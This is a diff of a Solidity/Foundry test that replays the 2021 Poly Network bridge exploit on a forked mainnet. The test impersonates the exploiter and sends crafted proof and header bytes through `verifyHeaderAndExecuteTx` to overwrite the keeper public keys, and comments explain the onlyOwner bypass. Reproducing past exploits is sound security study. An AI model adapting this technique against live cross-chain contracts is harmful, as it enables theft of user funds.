@@ -1,12 +1,10 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity 0.8.10;
+pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "../../interface.sol";
 import "./utils.sol";
 
 interface IEthCrossChainManager {
-
     function verifyHeaderAndExecuteTx(
         bytes memory proof,
         bytes memory rawHeader,
@@ -14,32 +12,47 @@ interface IEthCrossChainManager {
         bytes memory curRawHeader,
         bytes memory headerSig
     ) external returns (bool);
-
 }
 
 interface IEthCrossChainData {
-
-    function putCurEpochStartHeight(uint32 curEpochStartHeight) external returns (bool);
+    function putCurEpochStartHeight(
+        uint32 curEpochStartHeight
+    ) external returns (bool);
     function getCurEpochStartHeight() external view returns (uint32);
-    function putCurEpochConPubKeyBytes(bytes calldata curEpochPkBytes) external returns (bool);
+    function putCurEpochConPubKeyBytes(
+        bytes calldata curEpochPkBytes
+    ) external returns (bool);
     function getCurEpochConPubKeyBytes() external view returns (bytes memory);
-    function markFromChainTxExist(uint64 fromChainId, bytes32 fromChainTx) external returns (bool);
-    function checkIfFromChainTxExist(uint64 fromChainId, bytes32 fromChainTx) external view returns (bool);
+    function markFromChainTxExist(
+        uint64 fromChainId,
+        bytes32 fromChainTx
+    ) external returns (bool);
+    function checkIfFromChainTxExist(
+        uint64 fromChainId,
+        bytes32 fromChainTx
+    ) external view returns (bool);
     function getEthTxHashIndex() external view returns (uint256);
     function putEthTxHash(bytes32 ethTxHash) external returns (bool);
-    function putExtraData(bytes32 key1, bytes32 key2, bytes calldata value) external returns (bool);
-    function getExtraData(bytes32 key1, bytes32 key2) external view returns (bytes memory);
+    function putExtraData(
+        bytes32 key1,
+        bytes32 key2,
+        bytes calldata value
+    ) external returns (bool);
+    function getExtraData(
+        bytes32 key1,
+        bytes32 key2
+    ) external view returns (bytes memory);
     function transferOwnership(address newOwner) external;
     function pause() external returns (bool);
     function unpause() external returns (bool);
     function paused() external view returns (bool);
     // Not used currently by ECCM
-    function getEthTxHash(uint256 ethTxHashIndex) external view returns (bytes32);
-
+    function getEthTxHash(
+        uint256 ethTxHashIndex
+    ) external view returns (bytes32);
 }
 
 contract ContractTest is Test {
-
     struct Header {
         uint32 version;
         uint64 chainId;
@@ -74,10 +87,8 @@ contract ContractTest is Test {
     address EthCrossChainManager = 0x838bf9E95CB12Dd76a54C9f9D2E3082EAF928270;
     address EthCrossChainData = 0xcF2afe102057bA5c16f899271045a0A37fCb10f2;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("mainnet", 12_996_658); //fork mainnet at block 12996658
+        vm.createSelectFork("mainnet", 12_996_658); //fork mainnet at block 12996658
     }
 
     function testExploit() public {
@@ -92,12 +103,13 @@ contract ContractTest is Test {
         // By sending this cross-chain message, the user could trick the EthCrossChainManager into calling the EthCrossChainData contract, passing the onlyOwner check. Now the user just had to craft the right data to be able to trigger the function that changes the public keys…
 
         // https://etherscan.io/tx/0xb1f70464bd95b774c6ce60fc706eb5f9e35cb5f06e6cfe7c17dcda46ffd59581/advanced
-        cheats.startPrank(exploiter);
+        vm.startPrank(exploiter);
         emit log_named_bytes(
-            "existing CurEpochConPubKeyBytes", IEthCrossChainData(EthCrossChainData).getCurEpochConPubKeyBytes()
+            "existing CurEpochConPubKeyBytes",
+            IEthCrossChainData(EthCrossChainData).getCurEpochConPubKeyBytes()
         );
-        bytes memory rawHeader =
-            hex"0000000000000000000000008446719cbe62cf6fb9e3fb95a6c12882c5a3d885ad1dd8f2785e48d617d12708d38136a7df909f371a9f835d3ad58637e0dbc2f3e0f4bb60228730a46f77839a773046bcc14f6079db9033d0ab6176f171384070729fbfd2086a418e7e057717f3e67f4b67c999d13c258e5657f4dc0b5553e1836d0d81d1bff05b621053834bc7471261843aa80030451454a4f4b560fd13017b226c6561646572223a332c227672665f76616c7565223a22424851706a716f325767494d616a7a5a5a6c4158507951506c7a3357456e4a534e7470682b35416346376f37654b784e48486742704156724e54666f674c73485264394c7a544a5666666171787036734a637570324d303d222c227672665f70726f6f66223a226655346f56364462526d543264744d5254397a326b366853314f6f42584963397a72544956784974576348652f4b56594f2b58384f5167746143494d676139682f59615548564d514e554941326141484f664d545a773d3d222c226c6173745f636f6e6669675f626c6f636b5f6e756d223a31303938303030302c226e65775f636861696e5f636f6e666967223a6e756c6c7d0000000000000000000000000000000000000000";
+        bytes
+            memory rawHeader = hex"0000000000000000000000008446719cbe62cf6fb9e3fb95a6c12882c5a3d885ad1dd8f2785e48d617d12708d38136a7df909f371a9f835d3ad58637e0dbc2f3e0f4bb60228730a46f77839a773046bcc14f6079db9033d0ab6176f171384070729fbfd2086a418e7e057717f3e67f4b67c999d13c258e5657f4dc0b5553e1836d0d81d1bff05b621053834bc7471261843aa80030451454a4f4b560fd13017b226c6561646572223a332c227672665f76616c7565223a22424851706a716f325767494d616a7a5a5a6c4158507951506c7a3357456e4a534e7470682b35416346376f37654b784e48486742704156724e54666f674c73485264394c7a544a5666666171787036734a637570324d303d222c227672665f70726f6f66223a226655346f56364462526d543264744d5254397a326b366853314f6f42584963397a72544956784974576348652f4b56594f2b58384f5167746143494d676139682f59615548564d514e554941326141484f664d545a773d3d222c226c6173745f636f6e6669675f626c6f636b5f6e756d223a31303938303030302c226e65775f636861696e5f636f6e666967223a6e756c6c7d0000000000000000000000000000000000000000";
         // https://github.com/polynetwork/eth-contracts/blob/d16252b2b857eecf8e558bd3e1f3bb14cff30e9b/contracts/core/cross_chain_manager/libs/EthCrossChainUtils.sol
         Header memory header = Header({
             version: 0,
@@ -113,8 +125,8 @@ contract ContractTest is Test {
             nextBookkeeper: hex"0000000000000000000000000000000000000000"
         });
 
-        bytes memory proof =
-            hex"af2080cc978479eb082e1e656993c63dee7a5d08a00dc2b2aab88bc0e465cfa0721a0300000000000000200c28ffffaa7c5602285476ad860c54039782f8f20bd3677ba3d5250661ba71f708ea3100000000000014e1a18842891f8e82a5e6e5ad0a06d8448fe2f407020000000000000014cf2afe102057ba5c16f899271045a0a37fcb10f20b66313132313331383039331d010000000000000014a87fb85a93ca072cd4e5f0d4f178bc831df8a00b01362cad381a1e2432383300391908794fb71a2acd717d2f1565a40e7f8d36f9d5017b5baaca2a25e97f5afa40e98f87b0eca2eb0e9e7f24684d1b56db214aa51b3301ee1671b66cad1415453c0544d7e4425c1632e1b7dfdae3bd642ed7954e9f9b0d";
+        bytes
+            memory proof = hex"af2080cc978479eb082e1e656993c63dee7a5d08a00dc2b2aab88bc0e465cfa0721a0300000000000000200c28ffffaa7c5602285476ad860c54039782f8f20bd3677ba3d5250661ba71f708ea3100000000000014e1a18842891f8e82a5e6e5ad0a06d8448fe2f407020000000000000014cf2afe102057ba5c16f899271045a0a37fcb10f20b66313132313331383039331d010000000000000014a87fb85a93ca072cd4e5f0d4f178bc831df8a00b01362cad381a1e2432383300391908794fb71a2acd717d2f1565a40e7f8d36f9d5017b5baaca2a25e97f5afa40e98f87b0eca2eb0e9e7f24684d1b56db214aa51b3301ee1671b66cad1415453c0544d7e4425c1632e1b7dfdae3bd642ed7954e9f9b0d";
         // value length: af
         // ToMerkleValue.txHash length: 20
         // ToMerkleValue.txHash: 80cc978479eb082e1e656993c63dee7a5d08a00dc2b2aab88bc0e465cfa0721a
@@ -156,12 +168,12 @@ contract ContractTest is Test {
 
         // https://github.com/polynetwork/eth-contracts/blob/d16252b2b857eecf8e558bd3e1f3bb14cff30e9b/contracts/core/cross_chain_manager/logic/EthCrossChainManager.sol#L127
         IEthCrossChainManager(EthCrossChainManager).verifyHeaderAndExecuteTx({ // 0xd450e04c
-            proof: proof,
-            rawHeader: rawHeader,
-            headerProof: hex"",
-            curRawHeader: hex"",
-            headerSig: hex"7e3359dec445d7d49b80d9999ef2e34f01b6526f2a0b848fcb223201b21ced0e51bece6815510bf7283e98175c0bdfde8b5b1bdc38beef5e7b8ab1b8e8d1b2c900428e40826b3606e0b684d66e9406a5c0d69c16a5cbda8fefe176716f3286e872361ed29bd945b56d5af3a8c581d2b627f679061282f11a6e9b021fe3426faece00e09479bd3581f9eb27be273a761c509f6f20bde1c6a4187fa082c4e55b2f07684034b50075441c51cfc3061879bcf04e5a256b21379f67a2dc0643843bf6438000"
-        });
+                proof: proof,
+                rawHeader: rawHeader,
+                headerProof: hex"",
+                curRawHeader: hex"",
+                headerSig: hex"7e3359dec445d7d49b80d9999ef2e34f01b6526f2a0b848fcb223201b21ced0e51bece6815510bf7283e98175c0bdfde8b5b1bdc38beef5e7b8ab1b8e8d1b2c900428e40826b3606e0b684d66e9406a5c0d69c16a5cbda8fefe176716f3286e872361ed29bd945b56d5af3a8c581d2b627f679061282f11a6e9b021fe3426faece00e09479bd3581f9eb27be273a761c509f6f20bde1c6a4187fa082c4e55b2f07684034b50075441c51cfc3061879bcf04e5a256b21379f67a2dc0643843bf6438000"
+            });
         // a) 0x69d48074: getCurEpochConPubKeyBytes()
         // b) 0x5ac40790: getCurEpochStartHeight()
         // c) 0x0586763c000000000000000000000000000000000000000000000000000000000000000380cc978479eb082e1e656993c63dee7a5d08a00dc2b2aab88bc0e465cfa0721a: checkIfFromChainTxExist(uint64,bytes32)
@@ -171,7 +183,8 @@ contract ContractTest is Test {
         // https://github.com/polynetwork/eth-contracts/blob/d16252b2b857eecf8e558bd3e1f3bb14cff30e9b/contracts/core/cross_chain_manager/logic/EthCrossChainManager.sol#L183
         // (success, returnData) = EthCrossChainData.call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(toMerkleValue.makeTxParam.method, "(bytes,bytes,uint64)"))), abi.encode(toMerkleValue.makeTxParam.args, toMerkleValue.makeTxParam.fromContractAddr, toMerkleValue.makeTxParam.fromChainId)));
         emit log_named_bytes(
-            "changed CurEpochConPubKeyBytes", IEthCrossChainData(EthCrossChainData).getCurEpochConPubKeyBytes()
+            "changed CurEpochConPubKeyBytes",
+            IEthCrossChainData(EthCrossChainData).getCurEpochConPubKeyBytes()
         );
 
         // token transfer: https://etherscan.io/tx/0xad7a2c70c958fcd3effbf374d0acf3774a9257577625ae4c838e24b0de17602a
@@ -197,5 +210,4 @@ contract ContractTest is Test {
     }
 
     receive() external payable {}
-
 }
